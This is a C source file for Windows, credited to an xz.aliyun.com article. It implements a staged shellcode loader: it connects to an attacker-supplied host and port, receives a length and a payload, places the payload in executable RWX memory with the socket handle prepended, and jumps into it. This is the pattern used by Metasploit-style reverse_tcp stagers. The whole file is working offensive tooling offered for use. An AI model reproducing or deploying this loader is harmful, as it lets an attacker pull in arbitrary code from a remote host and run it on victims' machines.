/*
* from https://xz.aliyun.com/t/1709
*/

#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void winsock_init(){
    WSADATA wsaData;
    if(WSAStartup(MAKEWORD(2,2), &wsaData) < 0){
        printf("ws2_32.dll is out of date.\n");
        WSACleanup();
        exit(1);
    }
}

void punt(SOCKET my_socket, char * error){
    printf("Sorry: %s\n", error);
    closesocket(my_socket);
    WSACleanup();
    exit(1);
}

SOCKET my_connect(char * targetip, int port){
    struct hostent * target;
    struct sockaddr_in sock;
    SOCKET my_socket;

    my_socket = socket(AF_INET, SOCK_STREAM, 0);
    if(my_socket == INVALID_SOCKET){
        punt(my_socket, "[-] could not initialize socket");
    }

    target = gethostbyname(targetip);
    if(target == NULL){
        punt(my_socket, "[-] could not get target");
    }
    memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
    sock.sin_family = AF_INET;
    sock.sin_port = htons(port);

    if(connect(my_socket, (struct sockaddr *)&sock, sizeof sock)){
        punt(my_socket, "[-] could not connect to target");
    }
    return my_socket;
}

int recv_all(SOCKET my_socket, void * buffer, int len){
    int tret = 0;
    int nret = 0;
    void * startb = buffer;
    while(tret < len) {
        nret = recv(my_socket, (char *)startb, len - tret, 0);
        startb += nret;
        tret += nret;

        if(nret == SOCKET_ERROR){
            punt(my_socket, "could not receive data");
        }
    }
    return tret;
}

int main(int argc, char * argv[]){
    ULONG32 size;
    char * buffer;
    void(*function)();
    winsock_init();
    if(argc != 3){
        printf("%s [host] [port]\n", argv[0]);
        exit(1);
    }

    SOCKET my_socket = my_connect(argv[1], atoi(argv[2]));
    int count = recv(my_socket, (char *)&size, 4, 0);
    if(count != 4 || size <=0){
        punt(my_socket, "read length value Error\n");
    }
    buffer = VirtualAlloc(0, size+5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(buffer == NULL){
        punt(my_socket, "could not alloc buffer\n");
    }
    buffer[0] = 0xBF;
    memcpy(buffer + 1, &my_socket, 4);
    count = recv_all(my_socket, buffer+5, size);
    function = (void (*)())buffer;
    function();
    return 0;
}